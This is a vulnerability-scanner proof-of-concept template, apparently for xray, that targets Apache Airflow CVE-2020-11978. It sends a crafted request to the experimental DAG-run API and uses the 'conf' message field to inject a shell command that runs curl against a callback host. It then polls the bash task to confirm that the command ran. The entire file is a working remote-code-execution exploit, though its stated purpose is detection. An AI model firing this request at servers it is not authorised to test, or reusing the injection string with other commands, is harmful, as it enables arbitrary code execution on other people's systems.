name: poc-yaml-apache-airflow-cve-2020-11978-rce
binding: 38954de0-51d7-4398-9c2c-15b8038f73e6
manual: true
detail:
    author: 小z
    links:
        - https://github.com/pberba/CVE-2020-11978
    vulnerability:
        level: high
    warning: 可能会留下一个不安全的运行任务，请注意删除
transport: http
set:
    reverse: newReverse()
    reverseUrl: reverse.url
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /api/experimental/dags/example_trigger_target_dag/dag_runs
            headers:
                Content-Type: application/json
            body: '{"conf": {"message": "\"; curl {{reverseUrl}} #"}}'
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("execution_date") && response.content_type.contains("application/json")
        output:
            search: '''"execution_date":"(?P<date>.*?)",''.submatch(response.body_string)'
            date: search["date"]
    r1:
        request:
            cache: true
            method: GET
            path: /api/experimental/dags/example_trigger_target_dag/dag_runs/{{date}}/tasks/bash_task
            follow_redirects: false
        expression: reverse.wait(15)
expression: r0() && r1()
